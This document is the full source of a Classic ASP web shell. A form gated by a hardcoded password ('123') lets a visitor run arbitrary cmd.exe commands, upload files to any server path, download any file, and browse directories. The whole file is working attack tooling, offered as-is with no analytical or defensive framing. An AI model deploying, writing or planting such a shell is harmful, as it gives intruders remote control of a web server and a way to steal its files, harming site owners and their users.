<%@ Language=VBScript %>
<%
Const PASSWORD = "123"
Dim output : output = ""

' ===================== AUTHENTICATION =====================
Dim auth
auth = Request.Cookies("auth")

If auth <> PASSWORD Then
    If Request.Form("auth") = PASSWORD Then
        Response.Cookies("auth") = PASSWORD
        Response.Redirect Request.ServerVariables("SCRIPT_NAME")
    End If

    Response.Write "<form method='post'><input type='password' name='auth'/><input type='submit' value='Login'/></form>"
    Response.End
End If

' ===================== VARIABLES =====================
Dim path, cmd, download
path = Trim(Request("path"))
If path = "" Then path = Server.MapPath(".")

cmd = Request("cmd")
download = Request("download")

' ===================== FILE UPLOAD (FIXED) =====================
If Request.ServerVariables("REQUEST_METHOD") = "POST" And Request.TotalBytes > 0 Then
    On Error Resume Next

    Dim binData, boundary, header, filename, startPos, endPos
    Dim streamIn, streamText, streamOut

    binData = Request.BinaryRead(Request.TotalBytes)

    ' Convert binary to text to extract headers
    Set streamIn = Server.CreateObject("ADODB.Stream")
    streamIn.Type = 1
    streamIn.Open
    streamIn.Write binData
    streamIn.Position = 0
    streamIn.Type = 2
    streamIn.Charset = "utf-8"
    header = streamIn.ReadText

    ' Extract filename
    Dim fStart, fEnd
    fStart = InStr(header, "filename=""") + 10
    fEnd = InStr(fStart, header, """")
    filename = Mid(header, fStart, fEnd - fStart)
    filename = Replace(filename, "\", "") ' remove full path

    If filename <> "" Then
        ' Extract boundary
        boundary = Left(header, InStr(header, vbCrLf) - 1)

        ' Find binary start/end
        startPos = InStrB(binData, ChrB(13) & ChrB(10) & ChrB(13) & ChrB(10)) + 4
        endPos = InStrB(startPos, binData, ChrB(13) & ChrB(10) & ChrB(45) & ChrB(45) & boundary)

        ' Save file
        Set streamOut = Server.CreateObject("ADODB.Stream")
        streamOut.Type = 1
        streamOut.Open
        streamOut.Write MidB(binData, startPos, endPos - startPos)

        Dim savePath
        savePath = path & "\" & filename
        streamOut.SaveToFile savePath, 2
        streamOut.Close

        output = "✅ File uploaded successfully: " & filename
    Else
        output = "❌ No file selected!"
    End If

    On Error GoTo 0
End If

' ===================== DOWNLOAD =====================
If download <> "" Then
    Dim dstream
    Set dstream = Server.CreateObject("ADODB.Stream")
    dstream.Type = 1
    dstream.Open
    dstream.LoadFromFile download
    Response.ContentType = "application/octet-stream"
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(download, InStrRev(download,"\")+1)
    Response.BinaryWrite dstream.Read
    dstream.Close
    Response.End
End If

' ===================== COMMAND EXECUTION =====================
If cmd <> "" Then
    On Error Resume Next
    Dim WShell, exec
    Set WShell = Server.CreateObject("WScript.Shell")
    Set exec = WShell.Exec("cmd.exe /c " & cmd)
    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
    If Err.Number <> 0 Then output = "Cmd Error: " & Err.Description
    On Error GoTo 0
End If
%>

<html>
<head>
    <title>Classic ASP Web Shell</title>
    <style>
        body{font-family:monospace; background:#111; color:#0f0;}
        input, button {padding:5px;}
        pre {background:#222; padding:10px;}
    </style>
</head>
<body>
    <h2>Classic ASP Web Shell</h2>
    
    <form method="get">
        Path: <input type="text" name="path" value="<%=Server.HTMLEncode(path)%>" style="width:500px"/>
        <input type="submit" value="Browse"/>
    </form>
    
    <form method="get">
        Command: <input type="text" name="cmd" style="width:500px"/>
        <input type="submit" value="Run"/>
    </form>
    
    <form method="post" enctype="multipart/form-data">
        Upload file: <input type="file" name="file"/>
        <input type="submit" value="Upload"/>
        <input type="hidden" name="path" value="<%=Server.HTMLEncode(path)%>"/>
    </form>
    
    <hr>
    <pre><%=Server.HTMLEncode(output)%></pre>
    <%= ListFiles(path) %>
</body>
</html>

<%
' ===================== LIST FILES =====================
Function ListFiles(p)
    Dim html : html = "<h3>Index of " & Server.HTMLEncode(p) & "</h3><ul>"
    Dim fso, folder, item
   
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
   
    If fso.FolderExists(p) Then
        Set folder = fso.GetFolder(p)
       
        ' Folders
        For Each item In folder.SubFolders
            html = html & "<li><a href='?path=" & Server.URLEncode(item.Path) & "'><b>[" & Server.HTMLEncode(item.Name) & "]</b></a></li>"
        Next
       
        ' Files
        For Each item In folder.Files
            html = html & "<li>" & Server.HTMLEncode(item.Name) & " - " & _
                         "<a href='?download=" & Server.URLEncode(item.Path) & "'>[Download]</a></li>"
        Next
    Else
        html = html & "<li style='color:red'>Path not found!</li>"
    End If
   
    html = html & "</ul>"
    ListFiles = html
    On Error GoTo 0
End Function
%>
